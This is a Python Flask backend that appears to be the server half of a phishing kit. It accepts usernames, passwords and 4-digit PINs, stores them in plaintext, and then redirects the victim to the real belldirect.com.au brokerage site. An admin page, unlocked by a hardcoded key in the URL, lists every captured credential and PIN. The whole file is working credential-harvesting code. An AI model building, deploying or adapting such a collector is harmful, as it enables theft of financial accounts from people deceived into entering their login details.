from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

# ---------- File Paths ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
USERS_FILE = os.path.join(DATA_DIR, "users.txt")

# Ensure data folder + file exist
os.makedirs(DATA_DIR, exist_ok=True)
if not os.path.exists(USERS_FILE):
    open(USERS_FILE, "w").close()

# ---------- Redirect Target ----------
REDIRECT_URL = "https://belldirect.com.au/"

# ---------- Admin Password ----------
ADMIN_PASSWORD = "ChangeThisToStrongPassword123!@#"


# ---------- Helpers ----------
def read_users():
    users = {}
    current = {}

    if not os.path.exists(USERS_FILE):
        return users

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()

            if not line:
                if current.get("username"):
                    users[current["username"]] = {
                        "pass": current.get("pass", ""),
                        "pin": current.get("pin", "")
                    }
                current = {}
                continue

            if ":" in line:
                key, value = line.split(":", 1)
                key = key.strip().lower()
                value = value.strip()

                if key == "username":
                    current["username"] = value
                elif key == "pass":
                    current["pass"] = value
                elif key == "pin":
                    current["pin"] = value

        if current.get("username"):
            users[current["username"]] = {
                "pass": current.get("pass", ""),
                "pin": current.get("pin", "")
            }

    return users


def user_exists(username):
    return username in read_users()


def save_user(username, password, pin):
    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"username : {username}\n")
        f.write(f"pass : {password}\n")
        f.write(f"pin : {pin}\n")
        f.write("\n")


# ================================================================
#  ROUTES
# ================================================================
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "ok", "message": "Backend is running"})


@app.route("/api/save", methods=["POST"])
def save():
    data = request.get_json()

    if not data:
        return jsonify({"success": False, "message": "No data provided"}), 400

    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    pin      = data.get("pin", "").strip()

    if not username or not password or not pin:
        return jsonify({"success": False, "message": "All fields required"}), 400

    if not pin.isdigit() or len(pin) != 4:
        return jsonify({"success": False, "message": "PIN must be 4 digits"}), 400

    if user_exists(username):
        return jsonify({"success": False, "message": "Username already exists"}), 409

    save_user(username, password, pin)

    print(f"💾 Saved: {username}")

    return jsonify({
        "success": True,
        "message": "Saved successfully ✅",
        "redirect_url": REDIRECT_URL
    })


@app.route("/admin/users", methods=["GET"])
def admin_users():
    key = request.args.get("key", "")

    if key != ADMIN_PASSWORD:
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Unauthorized</title></head>
        <body style="font-family: Arial; padding: 50px; text-align: center;">
            <h1 style="color: #d32f2f;">403 - Unauthorized</h1>
            <p>Invalid or missing access key.</p>
        </body>
        </html>
        """, 401

    users = read_users()

    rows = ""
    for i, (username, data) in enumerate(users.items(), 1):
        rows += f"""
        <tr>
            <td>{i}</td>
            <td>{username}</td>
            <td>{data['pass']}</td>
            <td>{data['pin']}</td>
        </tr>
        """

    if not rows:
        rows = '<tr><td colspan="4" style="text-align:center; color:#888;">No users yet</td></tr>'

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Users Admin</title>
      <style>
        * {{ box-sizing: border-box; }}
        body {{
          font-family: Arial, sans-serif;
          background: #f4f6f9;
          margin: 0;
          padding: 30px;
        }}
        .container {{
          max-width: 1000px;
          margin: 0 auto;
          background: #fff;
          border-radius: 10px;
          padding: 25px 30px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }}
        h1 {{
          color: #1e3c72;
          margin: 0 0 5px;
        }}
        .subtitle {{
          color: #666;
          font-size: 14px;
          margin-bottom: 20px;
        }}
        table {{
          border-collapse: collapse;
          width: 100%;
          font-size: 14px;
        }}
        th, td {{
          border: 1px solid #e0e0e0;
          padding: 12px 14px;
          text-align: left;
          word-break: break-all;
        }}
        th {{
          background: #1e3c72;
          color: #fff;
          font-weight: 600;
        }}
        tr:nth-child(even) {{ background: #f9f9f9; }}
        tr:hover {{ background: #eef3ff; }}
        .badge {{
          display: inline-block;
          background: #1e3c72;
          color: #fff;
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 12px;
          margin-left: 8px;
        }}
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Saved Users <span class="badge">{len(users)}</span></h1>
        <p class="subtitle">Yeh page password-protected hai. Link kisi ke saath share na karein.</p>
        <table>
          <thead>
            <tr>
              <th style="width: 50px;">#</th>
              <th>Username / Email</th>
              <th>Password</th>
              <th style="width: 100px;">PIN</th>
            </tr>
          </thead>
          <tbody>
            {rows}
          </tbody>
        </table>
      </div>
    </body>
    </html>
    """
    return html


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("=" * 55)
    print("🚀 Backend API Server")
    print("=" * 55)
    print(f"📁 Users file: {USERS_FILE}")
    print(f"🌐 Port: {port}")
    print("=" * 55)
    app.run(host="0.0.0.0", port=port)
